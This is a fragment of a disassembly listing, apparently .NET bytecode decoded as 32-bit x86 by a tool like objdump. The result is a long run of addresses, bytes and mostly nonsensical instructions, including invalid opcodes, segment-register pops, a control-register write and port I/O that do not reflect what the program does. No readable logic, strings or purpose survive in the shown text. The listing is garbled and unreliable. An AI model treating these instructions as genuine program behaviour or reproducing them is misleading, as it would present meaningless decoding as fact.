  402b0d:	58                   	pop    %eax
  402b0e:	13 07                	adc    (%edi),%eax
  402b10:	11 07                	adc    %eax,(%edi)
  402b12:	07                   	pop    %es
  402b13:	3f                   	aas
  402b14:	6a ff                	push   $0xffffffff
  402b16:	ff                   	(bad)
  402b17:	ff 02                	incl   (%edx)
  402b19:	09 6f 3a             	or     %ebp,0x3a(%edi)
  402b1c:	00 00                	add    %al,(%eax)
  402b1e:	0a 08                	or     (%eax),%cl
  402b20:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402b23:	3a 00                	cmp    (%eax),%al
  402b25:	00 0a                	add    %cl,(%edx)
  402b27:	08 2a                	or     %ch,(%edx)
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	00 13                	add    %dl,(%ebx)
  402b2d:	30 04 00             	xor    %al,(%eax,%eax,1)
  402b30:	77 00                	ja     0x402b32
  402b32:	00 00                	add    %al,(%eax)
  402b34:	0c 00                	or     $0x0,%al
  402b36:	00 11                	add    %dl,(%ecx)
  402b38:	02 03                	add    (%ebx),%al
  402b3a:	28 50 00             	sub    %dl,0x0(%eax)
  402b3d:	00 0a                	add    %cl,(%edx)
  402b3f:	04 28                	add    $0x28,%al
  402b41:	50                   	push   %eax
  402b42:	00 00                	add    %al,(%eax)
  402b44:	0a 6b 0a             	or     0xa(%ebx),%ch
  402b47:	02 03                	add    (%ebx),%al
  402b49:	28 51 00             	sub    %dl,0x0(%ecx)
  402b4c:	00 0a                	add    %cl,(%edx)
  402b4e:	04 28                	add    $0x28,%al
  402b50:	51                   	push   %ecx
  402b51:	00 00                	add    %al,(%eax)
  402b53:	0a 6b 0b             	or     0xb(%ebx),%ch
  402b56:	07                   	pop    %es
  402b57:	06                   	push   %es
  402b58:	33 06                	xor    (%esi),%eax
  402b5a:	22 00                	and    (%eax),%al
  402b5c:	00 00                	add    %al,(%eax)
  402b5e:	00 2a                	add    %ch,(%edx)
  402b60:	07                   	pop    %es
  402b61:	02 6b 33             	add    0x33(%ebx),%ch
  402b64:	0b 03                	or     (%ebx),%eax
  402b66:	04 59                	add    $0x59,%al
  402b68:	6b 07 06             	imul   $0x6,(%edi),%eax
  402b6b:	59                   	pop    %ecx
  402b6c:	5b                   	pop    %ebx
  402b6d:	0c 2b                	or     $0x2b,%al
  402b6f:	25 07 03 6b 33       	and    $0x336b0307,%eax
  402b74:	11 22                	adc    %esp,(%edx)
  402b76:	00 00                	add    %al,(%eax)
  402b78:	00 40 04             	add    %al,0x4(%eax)
  402b7b:	02 59 6b             	add    0x6b(%ecx),%bl
  402b7e:	07                   	pop    %es
  402b7f:	06                   	push   %es
  402b80:	59                   	pop    %ecx
  402b81:	5b                   	pop    %ebx
  402b82:	58                   	pop    %eax
  402b83:	0c 2b                	or     $0x2b,%al
  402b85:	0f 22 00             	mov    %eax,%cr0
  402b88:	00 80 40 02 03 59    	add    %al,0x59030240(%eax)
  402b8e:	6b 07 06             	imul   $0x6,(%edi),%eax
  402b91:	59                   	pop    %ecx
  402b92:	5b                   	pop    %ebx
  402b93:	58                   	pop    %eax
  402b94:	0c 08                	or     $0x8,%al
  402b96:	22 00                	and    (%eax),%al
  402b98:	00 70 42             	add    %dh,0x42(%eax)
  402b9b:	5a                   	pop    %edx
  402b9c:	0c 08                	or     $0x8,%al
  402b9e:	22 00                	and    (%eax),%al
  402ba0:	00 00                	add    %al,(%eax)
  402ba2:	00 34 08             	add    %dh,(%eax,%ecx,1)
  402ba5:	08 22                	or     %ah,(%edx)
  402ba7:	00 00                	add    %al,(%eax)
  402ba9:	b4 43                	mov    $0x43,%ah
  402bab:	58                   	pop    %eax
  402bac:	0c 08                	or     $0x8,%al
  402bae:	2a 00                	sub    (%eax),%al
  402bb0:	13 30                	adc    (%eax),%esi
  402bb2:	03 00                	add    (%eax),%eax
  402bb4:	9a 00 00 00 0d 00 00 	lcall  $0x0,$0xd000000
  402bbb:	11 02                	adc    %eax,(%edx)
  402bbd:	22 00                	and    (%eax),%al
  402bbf:	00 70 42             	add    %dh,0x42(%eax)
  402bc2:	5b                   	pop    %ebx
  402bc3:	6c                   	insb   (%dx),%es:(%edi)
  402bc4:	28 4e 00             	sub    %cl,0x0(%esi)
  402bc7:	00 0a                	add    %cl,(%edx)
  402bc9:	69 1c 5d 0a 02 22 00 	imul   $0x5b427000,0x22020a(,%ebx,2),%ebx
  402bd0:	00 70 42 5b 
  402bd4:	02 22                	add    (%edx),%ah
  402bd6:	00 00                	add    %al,(%eax)
  402bd8:	70 42                	jo     0x402c1c
  402bda:	5b                   	pop    %ebx
  402bdb:	6c                   	insb   (%dx),%es:(%edi)
  402bdc:	28 4e 00             	sub    %cl,0x0(%esi)
  402bdf:	00 0a                	add    %cl,(%edx)
  402be1:	69 6b 59 0b 20 ff 00 	imul   $0xff200b,0x59(%ebx),%ebp
  402be8:	00 00                	add    %al,(%eax)
  402bea:	0c 08                	or     $0x8,%al
  402bec:	6b 22 00             	imul   $0x0,(%edx),%esp
  402bef:	00 80 3f 07 59 5a    	add    %al,0x5a59073f(%eax)
  402bf5:	d2 0d 08 6b 07 5a    	rorb   %cl,0x5a076b08
  402bfb:	d2 13                	rclb   %cl,(%ebx)
  402bfd:	04 06                	add    $0x6,%al
  402bff:	45                   	inc    %ebp
  402c00:	05 00 00 00 02       	add    $0x2000000,%eax
  402c05:	00 00                	add    %al,(%eax)
  402c07:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402c0a:	00 00                	add    %al,(%eax)
  402c0c:	16                   	push   %ss
  402c0d:	00 00                	add    %al,(%eax)
  402c0f:	00 20                	add    %ah,(%eax)
  402c11:	00 00                	add    %al,(%eax)
  402c13:	00 2a                	add    %ch,(%edx)
  402c15:	00 00                	add    %al,(%eax)
  402c17:	00 2b                	add    %ch,(%ebx)
  402c19:	32 08                	xor    (%eax),%cl
  402c1b:	11 04 09             	adc    %eax,(%ecx,%ecx,1)
  402c1e:	28 52 00             	sub    %dl,0x0(%edx)
  402c21:	00 0a                	add    %cl,(%edx)
  402c23:	2a 11                	sub    (%ecx),%dl
  402c25:	04 08                	add    $0x8,%al
  402c27:	09 28                	or     %ebp,(%eax)
  402c29:	52                   	push   %edx
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	0a 2a                	or     (%edx),%ch
  402c2e:	09 08                	or     %ecx,(%eax)
  402c30:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402c33:	52                   	push   %edx
  402c34:	00 00                	add    %al,(%eax)
  402c36:	0a 2a                	or     (%edx),%ch
  402c38:	09 11                	or     %edx,(%ecx)
  402c3a:	04 08                	add    $0x8,%al
  402c3c:	28 52 00             	sub    %dl,0x0(%edx)
  402c3f:	00 0a                	add    %cl,(%edx)
  402c41:	2a 11                	sub    (%ecx),%dl
  402c43:	04 09                	add    $0x9,%al
  402c45:	08 28                	or     %ch,(%eax)
  402c47:	52                   	push   %edx
  402c48:	00 00                	add    %al,(%eax)
  402c4a:	0a 2a                	or     (%edx),%ch
  402c4c:	08 09                	or     %cl,(%ecx)
  402c4e:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402c51:	52                   	push   %edx
  402c52:	00 00                	add    %al,(%eax)
  402c54:	0a 2a                	or     (%edx),%ch
  402c56:	2e 73 53             	jae,pn 0x402cac
  402c59:	00 00                	add    %al,(%eax)
  402c5b:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  402c61:	2a 36                	sub    (%esi),%dh
  402c63:	02 28                	add    (%eax),%ch
  402c65:	54                   	push   %esp
  402c66:	00 00                	add    %al,(%eax)
  402c68:	0a 02                	or     (%edx),%al
  402c6a:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402c6d:	00 06                	add    %al,(%esi)
  402c6f:	2a 7a 03             	sub    0x3(%edx),%bh
  402c72:	2c 13                	sub    $0x13,%al
  402c74:	02 7b 15             	add    0x15(%ebx),%bh
  402c77:	00 00                	add    %al,(%eax)
  402c79:	04 2c                	add    $0x2c,%al
  402c7b:	0b 02                	or     (%edx),%eax
  402c7d:	7b 15                	jnp    0x402c94
  402c7f:	00 00                	add    %al,(%eax)
  402c81:	04 6f                	add    $0x6f,%al
  402c83:	55                   	push   %ebp
  402c84:	00 00                	add    %al,(%eax)
  402c86:	0a 02                	or     (%edx),%al
  402c88:	03 28                	add    (%eax),%ebp
  402c8a:	56                   	push   %esi
  402c8b:	00 00                	add    %al,(%eax)
  402c8d:	0a 2a                	or     (%edx),%ch
  402c8f:	ce                   	into
  402c90:	02 73 57             	add    0x57(%ebx),%dh
  402c93:	00 00                	add    %al,(%eax)
  402c95:	0a 7d 15             	or     0x15(%ebp),%bh
  402c98:	00 00                	add    %al,(%eax)
  402c9a:	04 02                	add    $0x2,%al
  402c9c:	17                   	pop    %ss
  402c9d:	28 58 00             	sub    %bl,0x0(%eax)
  402ca0:	00 0a                	add    %cl,(%edx)
  402ca2:	02 20                	add    (%eax),%ah
  402ca4:	20 03                	and    %al,(%ebx)
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	20 c2                	and    %al,%dl
  402caa:	01 00                	add    %eax,(%eax)
  402cac:	00 73 59             	add    %dh,0x59(%ebx)
  402caf:	00 00                	add    %al,(%eax)
  402cb1:	0a 28                	or     (%eax),%ch
  402cb3:	5a                   	pop    %edx
  402cb4:	00 00                	add    %al,(%eax)
  402cb6:	0a 02                	or     (%edx),%al
  402cb8:	72 33                	jb     0x402ced
  402cba:	01 00                	add    %eax,(%eax)
  402cbc:	70 6f                	jo     0x402d2d
  402cbe:	5b                   	pop    %ebx
  402cbf:	00 00                	add    %al,(%eax)
  402cc1:	0a 2a                	or     (%edx),%ch
  402cc3:	00 13                	add    %dl,(%ebx)
  402cc5:	30 05 00 61 00 00    	xor    %al,0x6100
  402ccb:	00 00                	add    %al,(%eax)
  402ccd:	00 00                	add    %al,(%eax)
  402ccf:	00 14 fe             	add    %dl,(%esi,%edi,8)
  402cd2:	06                   	push   %es
  402cd3:	3e 00 00             	add    %al,%ds:(%eax)
  402cd6:	06                   	push   %es
  402cd7:	73 5c                	jae    0x402d35
  402cd9:	00 00                	add    %al,(%eax)
  402cdb:	0a 28                	or     (%eax),%ch
  402cdd:	5d                   	pop    %ebp
  402cde:	00 00                	add    %al,(%eax)
  402ce0:	0a 28                	or     (%eax),%ch
  402ce2:	5e                   	pop    %esi
  402ce3:	00 00                	add    %al,(%eax)
  402ce5:	0a 14 fe             	or     (%esi,%edi,8),%dl
  402ce8:	06                   	push   %es
  402ce9:	3f                   	aas
  402cea:	00 00                	add    %al,(%eax)
  402cec:	06                   	push   %es
  402ced:	73 5f                	jae    0x402d4e
  402cef:	00 00                	add    %al,(%eax)
  402cf1:	0a 6f 60             	or     0x60(%edi),%ch
  402cf4:	00 00                	add    %al,(%eax)
  402cf6:	0a 72 3f             	or     0x3f(%edx),%dh
  402cf9:	01 00                	add    %eax,(%eax)
  402cfb:	70 72                	jo     0x402d6f
  402cfd:	d6                   	salc
  402cfe:	02 00                	add    (%eax),%al
  402d00:	70 1a                	jo     0x402d1c
  402d02:	1f                   	pop    %ds
  402d03:	30 20                	xor    %ah,(%eax)
  402d05:	00 01                	add    %al,(%ecx)
  402d07:	00 00                	add    %al,(%eax)
  402d09:	28 61 00             	sub    %ah,0x0(%ecx)
  402d0c:	00 0a                	add    %cl,(%edx)
  402d0e:	1c 33                	sbb    $0x33,%al
  402d10:	1f                   	pop    %ds
  402d11:	72 f6                	jb     0x402d09
  402d13:	02 00                	add    (%eax),%al
  402d15:	70 72                	jo     0x402d89
  402d17:	ed                   	in     (%dx),%eax
  402d18:	03 00                	add    (%eax),%eax
  402d1a:	70 1a                	jo     0x402d36
  402d1c:	1f                   	pop    %ds
  402d1d:	30 20                	xor    %ah,(%eax)
  402d1f:	00 01                	add    %al,(%ecx)
  402d21:	00 00                	add    %al,(%eax)
  402d23:	28 61 00             	sub    %ah,0x0(%ecx)
  402d26:	00 0a                	add    %cl,(%edx)
  402d28:	1c 33                	sbb    $0x33,%al
  402d2a:	05 28 40 00 00       	add    $0x4028,%eax
  402d2f:	06                   	push   %es
  402d30:	2a 32                	sub    (%edx),%dh
  402d32:	03 6f 62             	add    0x62(%edi),%ebp
  402d35:	00 00                	add    %al,(%eax)
  402d37:	0a 28                	or     (%eax),%ch
  402d39:	63 00                	arpl   %eax,(%eax)
  402d3b:	00 0a                	add    %cl,(%edx)
  402d3d:	2a 00                	sub    (%eax),%al
  402d3f:	00 1b                	add    %bl,(%ebx)
  402d41:	30 07                	xor    %al,(%edi)
  402d43:	00 21                	add    %ah,(%ecx)
  402d45:	02 00                	add    (%eax),%al
  402d47:	00 0e                	add    %cl,(%esi)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 20                	adc    %esp,(%eax)
  402d4d:	00 02                	add    %al,(%edx)
  402d4f:	00 00                	add    %al,(%eax)
  402d51:	8d 42 00             	lea    0x0(%edx),%eax
  402d54:	00 01                	add    %al,(%ecx)
  402d56:	25 d0 1e 00 00       	and    $0x1ed0,%eax
  402d5b:	04 28                	add    $0x28,%al
  402d5d:	64 00 00             	add    %al,%fs:(%eax)
  402d60:	0a 0a                	or     (%edx),%cl
  402d62:	16                   	push   %ss
  402d63:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  402d66:	41                   	inc    %ecx
  402d67:	72 2f                	jb     0x402d98
  402d69:	04 00                	add    $0x0,%al
  402d6b:	70 12                	jo     0x402d7f
  402d6d:	04 28                	add    $0x28,%al
  402d6f:	65 00 00             	add    %al,%gs:(%eax)
  402d72:	0a 28                	or     (%eax),%ch
  402d74:	66 00 00             	data16 add %al,(%eax)
  402d77:	0a 20                	or     (%eax),%ah
  402d79:	00 00                	add    %al,(%eax)
  402d7b:	00 10                	add    %dl,(%eax)
  402d7d:	19 7e 67             	sbb    %edi,0x67(%esi)
  402d80:	00 00                	add    %al,(%eax)
  402d82:	0a 19                	or     (%ecx),%bl
  402d84:	16                   	push   %ss
  402d85:	7e 67                	jle    0x402dee
  402d87:	00 00                	add    %al,(%eax)
  402d89:	0a 28                	or     (%eax),%ch
  402d8b:	32 00                	xor    (%eax),%al
  402d8d:	00 06                	add    %al,(%esi)
  402d8f:	06                   	push   %es
  402d90:	20 00                	and    %al,(%eax)
  402d92:	02 00                	add    (%eax),%al
  402d94:	00 12                	add    %dl,(%edx)
  402d96:	05 7e 67 00 00       	add    $0x677e,%eax
  402d9b:	0a 28                	or     (%eax),%ch
  402d9d:	33 00                	xor    (%eax),%eax
  402d9f:	00 06                	add    %al,(%esi)
  402da1:	26 11 04 17          	adc    %eax,%es:(%edi,%edx,1)
  402da5:	58                   	pop    %eax
  402da6:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402da9:	04 1f                	add    $0x1f,%al
  402dab:	18 32                	sbb    %dh,(%edx)
  402dad:	b9 28 68 00 00       	mov    $0x6828,%ecx
  402db2:	0a 73 69             	or     0x69(%ebx),%dh
  402db5:	00 00                	add    %al,(%eax)
  402db7:	0a 0b                	or     (%ebx),%cl
  402db9:	17                   	pop    %ss
  402dba:	0c 1f                	or     $0x1f,%al
  402dbc:	1d 0d 28 6a 00       	sbb    $0x6a280d,%eax
  402dc1:	00 0a                	add    %cl,(%edx)
  402dc3:	28 6b 00             	sub    %ch,0x0(%ebx)
  402dc6:	00 0a                	add    %cl,(%edx)
  402dc8:	6f                   	outsl  %ds:(%esi),(%dx)
  402dc9:	6c                   	insb   (%dx),%es:(%edi)
  402dca:	00 00                	add    %al,(%eax)
  402dcc:	0a 09                	or     (%ecx),%cl
  402dce:	12 02                	adc    (%edx),%al
  402dd0:	1a 28                	sbb    (%eax),%ch
  402dd2:	1d 00 00 06 26       	sbb    $0x26060000,%eax
  402dd7:	7e 6d                	jle    0x402e46
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	0a 72 53             	or     0x53(%edx),%dh
  402dde:	04 00                	add    $0x0,%al
  402de0:	70 17                	jo     0x402df9
  402de2:	6f                   	outsl  %ds:(%esi),(%dx)
  402de3:	6e                   	outsb  %ds:(%esi),(%dx)
  402de4:	00 00                	add    %al,(%eax)
  402de6:	0a 13                	or     (%ebx),%dl
  402de8:	06                   	push   %es
  402de9:	11 06                	adc    %eax,(%esi)
  402deb:	2c 12                	sub    $0x12,%al
  402ded:	11 06                	adc    %eax,(%esi)
  402def:	72 b9                	jb     0x402daa
  402df1:	04 00                	add    $0x0,%al
  402df3:	70 16                	jo     0x402e0b
  402df5:	8c 48 00             	mov    %cs,0x0(%eax)
  402df8:	00 01                	add    %al,(%ecx)
  402dfa:	6f                   	outsl  %ds:(%esi),(%dx)
  402dfb:	6f                   	outsl  %ds:(%esi),(%dx)
  402dfc:	00 00                	add    %al,(%eax)
  402dfe:	0a de                	or     %dh,%bl
  402e00:	0c 11                	or     $0x11,%al
  402e02:	06                   	push   %es
  402e03:	2c 07                	sub    $0x7,%al
  402e05:	11 06                	adc    %eax,(%esi)
  402e07:	6f                   	outsl  %ds:(%esi),(%dx)
  402e08:	55                   	push   %ebp
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	0a dc                	or     %ah,%bl
  402e0d:	de 03                	fiadds (%ebx)
  402e0f:	26 de 00             	fiadds %es:(%eax)
  402e12:	07                   	pop    %es
  402e13:	20 b8 0b 00 00 20    	and    %bh,0x2000000b(%eax)
  402e19:	10 27                	adc    %ah,(%edi)
  402e1b:	00 00                	add    %al,(%eax)
  402e1d:	6f                   	outsl  %ds:(%esi),(%dx)
  402e1e:	70 00                	jo     0x402e20
  402e20:	00 0a                	add    %cl,(%edx)
  402e22:	28 71 00             	sub    %dh,0x0(%ecx)
  402e25:	00 0a                	add    %cl,(%edx)
  402e27:	7e 82                	jle    0x402dab
  402e29:	00 00                	add    %al,(%eax)
  402e2b:	04 25                	add    $0x25,%al
  402e2d:	2d 17 26 7e 81       	sub    $0x817e2617,%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	04 fe                	add    $0xfe,%al
  402e36:	06                   	push   %es
  402e37:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402e38:	00 00                	add    %al,(%eax)
  402e3a:	06                   	push   %es
  402e3b:	73 72                	jae    0x402eaf
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	0a 25 80 82 00 00    	or     0x8280,%ah
  402e45:	04 73                	add    $0x73,%al
  402e47:	73 00                	jae    0x402e49
  402e49:	00 0a                	add    %cl,(%edx)
  402e4b:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402e4f:	0a 07                	or     (%edi),%al
  402e51:	20 b8 0b 00 00 20    	and    %bh,0x2000000b(%eax)
  402e57:	10 27                	adc    %ah,(%edi)
  402e59:	00 00                	add    %al,(%eax)
  402e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5c:	70 00                	jo     0x402e5e
  402e5e:	00 0a                	add    %cl,(%edx)
  402e60:	28 71 00             	sub    %dh,0x0(%ecx)
  402e63:	00 0a                	add    %cl,(%edx)
  402e65:	73 9b                	jae    0x402e02
  402e67:	00 00                	add    %al,(%eax)
  402e69:	06                   	push   %es
  402e6a:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402e6e:	06                   	push   %es
  402e6f:	73 87                	jae    0x402df8
  402e71:	00 00                	add    %al,(%eax)
  402e73:	06                   	push   %es
  402e74:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402e78:	06                   	push   %es
  402e79:	07                   	pop    %es
  402e7a:	20 10                	and    %dl,(%eax)
  402e7c:	27                   	daa
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	6f                   	outsl  %ds:(%esi),(%dx)
  402e80:	41                   	inc    %ecx
  402e81:	00 00                	add    %al,(%eax)
  402e83:	0a 28                	or     (%eax),%ch
  402e85:	71 00                	jno    0x402e87
  402e87:	00 0a                	add    %cl,(%edx)
  402e89:	73 7c                	jae    0x402f07
  402e8b:	00 00                	add    %al,(%eax)
  402e8d:	06                   	push   %es
  402e8e:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402e92:	06                   	push   %es
  402e93:	73 78                	jae    0x402f0d
  402e95:	00 00                	add    %al,(%eax)
  402e97:	06                   	push   %es
  402e98:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402e9c:	06                   	push   %es
  402e9d:	73 83                	jae    0x402e22
  402e9f:	00 00                	add    %al,(%eax)
  402ea1:	06                   	push   %es
  402ea2:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402ea6:	06                   	push   %es
  402ea7:	73 8c                	jae    0x402e35
  402ea9:	00 00                	add    %al,(%eax)
  402eab:	06                   	push   %es
  402eac:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402eb0:	06                   	push   %es
  402eb1:	73 97                	jae    0x402e4a
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	06                   	push   %es
  402eb6:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402eba:	06                   	push   %es
  402ebb:	73 a4                	jae    0x402e61
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	06                   	push   %es
  402ec0:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402ec4:	06                   	push   %es
  402ec5:	16                   	push   %ss
  402ec6:	13 07                	adc    (%edi),%eax
  402ec8:	2b 47 7e             	sub    0x7e(%edi),%eax
  402ecb:	17                   	pop    %ss
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	04 16                	add    $0x16,%al
  402ed0:	07                   	pop    %es
  402ed1:	1f                   	pop    %ds
  402ed2:	0e                   	push   %cs
  402ed3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ed4:	41                   	inc    %ecx
  402ed5:	00 00                	add    %al,(%eax)
  402ed7:	0a 9e 07 1f 0a 6f    	or     0x6f0a1f07(%esi),%bl
  402edd:	41                   	inc    %ecx
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	0a 28                	or     (%eax),%ch
  402ee2:	41                   	inc    %ecx
  402ee3:	00 00                	add    %al,(%eax)
  402ee5:	06                   	push   %es
  402ee6:	7e 67                	jle    0x402f4f
  402ee8:	00 00                	add    %al,(%eax)
  402eea:	0a 7e 67             	or     0x67(%esi),%bh
  402eed:	00 00                	add    %al,(%eax)
  402eef:	0a 7e 67             	or     0x67(%esi),%bh
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	0a 20                	or     (%eax),%ah
  402ef6:	85 00                	test   %eax,(%eax)
  402ef8:	00 00                	add    %al,(%eax)
  402efa:	28 25 00 00 06 26    	sub    %ah,0x26060000
  402f00:	28 68 00             	sub    %ch,0x0(%eax)
  402f03:	00 0a                	add    %cl,(%edx)
  402f05:	73 69                	jae    0x402f70
  402f07:	00 00                	add    %al,(%eax)
  402f09:	0a 0b                	or     (%ebx),%cl
  402f0b:	11 07                	adc    %eax,(%edi)
  402f0d:	17                   	pop    %ss
  402f0e:	58                   	pop    %eax
  402f0f:	13 07                	adc    (%edi),%eax
  402f11:	11 07                	adc    %eax,(%edi)
  402f13:	1f                   	pop    %ds
  402f14:	14 32                	adc    $0x32,%al
  402f16:	b3 7e                	mov    $0x7e,%bl
  402f18:	16                   	push   %ss
  402f19:	00 00                	add    %al,(%eax)
  402f1b:	04 13                	add    $0x13,%al
  402f1d:	08 16                	or     %dl,(%esi)
  402f1f:	13 09                	adc    (%ecx),%ecx
  402f21:	2b 3b                	sub    (%ebx),%edi
  402f23:	11 08                	adc    %ecx,(%eax)
  402f25:	11 09                	adc    %ecx,(%ecx)
  402f27:	95                   	xchg   %eax,%ebp
  402f28:	26 1f                	es pop %ds
  402f2a:	13 17                	adc    (%edi),%edx
  402f2c:	16                   	push   %ss
  402f2d:	12 0a                	adc    (%edx),%cl
  402f2f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402f32:	00 06                	add    %al,(%esi)
  402f34:	26 7e 16             	es jle 0x402f4d
  402f37:	00 00                	add    %al,(%eax)
  402f39:	04 07                	add    $0x7,%al
  402f3b:	7e 16                	jle    0x402f53
  402f3d:	00 00                	add    %al,(%eax)
  402f3f:	04 8e                	add    $0x8e,%al
  402f41:	69 6f 41 00 00 0a 95 	imul   $0x950a0000,0x41(%edi),%ebp
  402f48:	16                   	push   %ss
  402f49:	16                   	push   %ss
  402f4a:	7e 67                	jle    0x402fb3
  402f4c:	00 00                	add    %al,(%eax)
  402f4e:	0a 1c 12             	or     (%edx,%edx,1),%bl
  402f51:	0b 28                	or     (%eax),%ebp
  402f53:	15 00 00 06 26       	adc    $0x26060000,%eax
  402f58:	11 09                	adc    %ecx,(%ecx)
  402f5a:	17                   	pop    %ss
  402f5b:	58                   	pop    %eax
  402f5c:	13 09                	adc    (%ecx),%ecx
  402f5e:	11 09                	adc    %ecx,(%ecx)
  402f60:	11 08                	adc    %ecx,(%eax)
  402f62:	8e 69 32             	mov    0x32(%ecx),%gs
  402f65:	bd 16 28 75 00       	mov    $0x752816,%ebp
  402f6a:	00 0a                	add    %cl,(%edx)
  402f6c:	2a 00                	sub    (%eax),%al
  402f6e:	00 00                	add    %al,(%eax)
  402f70:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402f73:	00 02                	add    %al,(%edx)
  402f75:	00 9d 00 18 b5 00    	add    %bl,0xb51800(%ebp)
  402f7b:	0c 00                	or     $0x0,%al
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 00                	add    %al,(%eax)
  402f81:	00 8b 00 38 c3 00    	add    %cl,0xc33800(%ebx)
  402f87:	03 14 00             	add    (%eax,%eax,1),%edx
  402f8a:	00 01                	add    %al,(%ecx)
  402f8c:	13 30                	adc    (%eax),%esi
  402f8e:	03 00                	add    (%eax),%eax
  402f90:	06                   	push   %es
  402f91:	01 00                	add    %eax,(%eax)
  402f93:	00 0f                	add    %cl,(%edi)
  402f95:	00 00                	add    %al,(%eax)
  402f97:	11 73 53             	adc    %esi,0x53(%ebx)
  402f9a:	00 00                	add    %al,(%eax)
  402f9c:	0a 0a                	or     (%edx),%cl
  402f9e:	06                   	push   %es
  402f9f:	1f                   	pop    %ds
  402fa0:	0f 1f 1e             	nopl   (%esi)
  402fa3:	6f                   	outsl  %ds:(%esi),(%dx)
  402fa4:	70 00                	jo     0x402fa6
  402fa6:	00 0a                	add    %cl,(%edx)
  402fa8:	0b 1a                	or     (%edx),%ebx
  402faa:	8d 48 00             	lea    0x0(%eax),%ecx
  402fad:	00 01                	add    %al,(%ecx)
  402faf:	25 d0 20 00 00       	and    $0x20d0,%eax
  402fb4:	04 28                	add    $0x28,%al
  402fb6:	64 00 00             	add    %al,%fs:(%eax)
  402fb9:	0a 0c 02             	or     (%edx,%eax,1),%cl
  402fbc:	45                   	inc    %ebp
  402fbd:	0a 00                	or     (%eax),%al
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	01 00                	add    %eax,(%eax)
  402fc3:	00 00                	add    %al,(%eax)
  402fc5:	13 00                	adc    (%eax),%eax
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	25 00 00 00 37       	and    $0x37000000,%eax
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	00 49 00             	add    %cl,0x0(%ecx)
  402fd3:	00 00                	add    %al,(%eax)
  402fd5:	5b                   	pop    %ebx
  402fd6:	00 00                	add    %al,(%eax)
  402fd8:	00 6d 00             	add    %ch,0x0(%ebp)
  402fdb:	00 00                	add    %al,(%eax)
  402fdd:	7f 00                	jg     0x402fdf
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	91                   	xchg   %eax,%ecx
  402fe2:	00 00                	add    %al,(%eax)
  402fe4:	00 a3 00 00 00 2a    	add    %ah,0x2a000000(%ebx)
  402fea:	08 06                	or     %al,(%esi)
  402fec:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  402ff2:	00 0a                	add    %cl,(%edx)
  402ff4:	94                   	xchg   %eax,%esp
  402ff5:	07                   	pop    %es
  402ff6:	28 43 00             	sub    %al,0x0(%ebx)
  402ff9:	00 06                	add    %al,(%esi)
  402ffb:	2a 08                	sub    (%eax),%cl
  402ffd:	06                   	push   %es
  402ffe:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  403004:	00 0a                	add    %cl,(%edx)
  403006:	94                   	xchg   %eax,%esp
  403007:	07                   	pop    %es
  403008:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40300c:	06                   	push   %es
  40300d:	2a 08                	sub    (%eax),%cl
  40300f:	06                   	push   %es
  403010:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  403016:	00 0a                	add    %cl,(%edx)
  403018:	94                   	xchg   %eax,%esp
  403019:	07                   	pop    %es
  40301a:	28 45 00             	sub    %al,0x0(%ebp)
  40301d:	00 06                	add    %al,(%esi)
  40301f:	2a 08                	sub    (%eax),%cl
  403021:	06                   	push   %es
  403022:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  403028:	00 0a                	add    %cl,(%edx)
  40302a:	94                   	xchg   %eax,%esp
  40302b:	07                   	pop    %es
  40302c:	28 46 00             	sub    %al,0x0(%esi)
  40302f:	00 06                	add    %al,(%esi)
  403031:	2a 08                	sub    (%eax),%cl
  403033:	06                   	push   %es
  403034:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  40303a:	00 0a                	add    %cl,(%edx)
  40303c:	94                   	xchg   %eax,%esp
  40303d:	07                   	pop    %es
  40303e:	28 47 00             	sub    %al,0x0(%edi)
  403041:	00 06                	add    %al,(%esi)
  403043:	2a 08                	sub    (%eax),%cl
  403045:	06                   	push   %es
  403046:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  40304c:	00 0a                	add    %cl,(%edx)
  40304e:	94                   	xchg   %eax,%esp
  40304f:	07                   	pop    %es
